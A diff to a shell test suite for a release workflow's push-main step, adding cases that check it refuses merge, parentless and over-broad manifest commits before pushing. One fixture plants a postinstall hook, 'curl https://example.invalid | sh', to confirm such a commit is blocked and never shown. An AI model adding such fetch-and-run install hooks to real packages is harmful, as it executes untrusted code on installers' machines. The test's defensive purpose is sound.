@@ -19,8 +19,10 @@
 # next run of the same package, whose checkout predates that bump — so b's push
 # is rejected and its rebase meets a's change on the same "version" line. In
 # the re-run cases, b plays a later attempt of a's run or of an older run; in
-# the refusal cases, b's HEAD carries a branch commit beside the bump, or a bump
-# that changes a second file, which push-main refuses before any push. A
+# the refusal cases, b's HEAD carries a branch commit beside the bump, a bump
+# that changes a second file, a manifest-only commit that changes more than the
+# version, or a merge commit over main's tip — or is a root commit with no
+# parent — each of which push-main refuses before any push. A
 # pre-receive hook that always rejects forces the exhaustion case. push-main
 # reaches origin as push-tag does: through the deploy key, with the GitHub URL
 # rewritten to the local origin by GIT_CONFIG_*, so the key directory is all
@@ -219,6 +221,98 @@ check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2b")" 
 check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2b")" seed)"
 
 echo
+echo "Case 2c: a manifest-only commit at the release version that carries more than the version is refused"
+# A branch whose one commit over main's tip already holds the release version:
+# "Set release version" changes nothing, `tag` commits nothing, and that commit
+# is what push-main sees as the bump. Whatever else the file carries must not
+# land, and must not be shown.
+setup "$work/c2c"
+record_hook "$work/c2c/origin.git"
+jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2c/b/packages/pkg/package.json" > "$work/c2c/b/tmp.json" \
+  && mv "$work/c2c/b/tmp.json" "$work/c2c/b/packages/pkg/package.json"
+git -C "$work/c2c/b" add packages/pkg/package.json
+git -C "$work/c2c/b" commit -q -m "feat: a release the author bumped"
+push_main "$work/c2c/b" 1.0.1 "$work/c2c/summary.md"
+check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
+check "error says the manifest differs in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from main's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
+check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
+check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from main's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
+check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
+check "nothing was pushed" "$(is "$seen" "")"
+check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2c")" 1.0.0)"
+check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2c")" seed)"
+
+echo
+echo "Case 2d: a manifest-only commit at the release version that changes nothing but the version lands"
+# The exact bump, authored on the branch under the author's own subject: what a
+# run from main would land, so parity lets it through.
+setup "$work/c2d"
+record_hook "$work/c2d/origin.git"
+set_version "$work/c2d/b" 1.0.1
+git -C "$work/c2d/b" add packages/pkg/package.json
+git -C "$work/c2d/b" commit -q -m "feat: a release the author bumped"
+push_main "$work/c2d/b" 1.0.1
+check "push-main exits 0" "$(is "$rc" 0)"
+check "origin/main holds the version" "$(is "$(origin_version "$work/c2d")" 1.0.1)"
+check "origin/main's tip is the author's commit" "$(is "$(origin_tip_subject "$work/c2d")" "feat: a release the author bumped")"
+check "the push went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
+
+echo
+echo "Case 2e: a merge commit over main's tip is refused, even one carrying only the bump"
+# Its first parent is the seed, its second main's tip, its tree the seed's plus
+# the bump: one commit main does not have, changing only the manifest against
+# its first parent, whose push would fast-forward main back to the seed's tree.
+setup "$work/c2e"
+change "$work/c2e/a" src/guard.js "feat: guard"
+git -C "$work/c2e/a" push -q origin main
+record_hook "$work/c2e/origin.git"
+tip=$(git -C "$work/c2e/origin.git" rev-parse main)
+git -C "$work/c2e/b" fetch -q origin main
+# `ours` never fast-forwards; --no-commit leaves the merge open for the bump
+# (its "stopped before committing" note goes to stderr).
+git -C "$work/c2e/b" merge -s ours --no-commit FETCH_HEAD >/dev/null 2>&1
+set_version "$work/c2e/b" 1.0.1
+git -C "$work/c2e/b" add packages/pkg/package.json
+git -C "$work/c2e/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
+check "the merge commit's parents are the seed and main's tip" \
+  "$(is "$(git -C "$work/c2e/b" log -1 --format=%P HEAD)" "$(git -C "$work/c2e/origin.git" rev-parse main^) $tip")"
+check "the merge commit changes only the manifest against its first parent" \
+  "$(is "$(git -C "$work/c2e/b" diff --name-only HEAD^ HEAD)" packages/pkg/package.json)"
+push_main "$work/c2e/b" 1.0.1 "$work/c2e/summary.md"
+check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
+check "error says HEAD has two parents" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 2 parents; the version-bump commit has one\. push-main pushes the one version-bump commit')"
+check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
+check "job summary says the same" "$(contains "$(cat "$work/c2e/summary.md" 2>/dev/null)" 'has 2 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
+check "nothing was pushed" "$(is "$seen" "")"
+check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2e/origin.git" rev-parse main)" "$tip")"
+check "origin/main still holds the file the merge would have dropped" "$(git -C "$work/c2e/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
+check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2e")" 1.0.0)"
+
+echo
+echo "Case 2f: a parentless HEAD is refused through the error sink"
+# A repository of one root commit holding the manifest at the release version:
+# it is one commit main does not have, and reading HEAD^ would die with git's
+# bare fatal, outside the ::error:: and the summary.
+setup "$work/c2f"
+record_hook "$work/c2f/origin.git"
+mkdir -p "$work/c2f/root/packages/pkg"
+git init -q -b main "$work/c2f/root"
+identity "$work/c2f/root"
+git -C "$work/c2f/root" remote add origin "$work/c2f/origin.git"
+printf '{\n  "name": "pkg",\n  "version": "1.0.1"\n}\n' > "$work/c2f/root/packages/pkg/package.json"
+git -C "$work/c2f/root" add -A
+git -C "$work/c2f/root" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
+push_main "$work/c2f/root" 1.0.1 "$work/c2f/summary.md"
+check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
+check "error says HEAD has no parent" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 0 parents; the version-bump commit has one\.')"
+check "no bare git fatal reaches the log" "$(is "$(contains "$out" '^fatal: ')" false)"
+check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
+check "job summary says the same" "$(contains "$(cat "$work/c2f/summary.md" 2>/dev/null)" 'has 0 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
+check "nothing was pushed" "$(is "$seen" "")"
+check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2f")" 1.0.0)"
+check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2f")" seed)"
+
+echo
 echo "Case 3: five rejections fail, saying the release succeeded and only the push is outstanding"
 setup "$work/c3"
 printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$work/c3/origin.git/hooks/pre-receive"
@@ -336,8 +430,8 @@ push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" GITHUB_REPOSITORY=
 check "no GITHUB_REPOSITORY: exits non-zero, naming it, and says the release itself succeeded" \
   "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::GITHUB_REPOSITORY.*The release itself succeeded')|$left" 'true|0' || echo false)"
 # HEAD:refs/heads/main serves a detached HEAD and a branch alike (a release job
-# may check out either); the one-commit check (case 2) is what keeps a branch's
-# commits off main.
+# may check out either); the pre-push checks (cases 2 to 2f) are what keep
+# everything but the exact bump off main.
 setup "$work/c8e"
 git -C "$work/c8e/b" checkout -q --detach
 bump "$work/c8e/b" 1.0.1
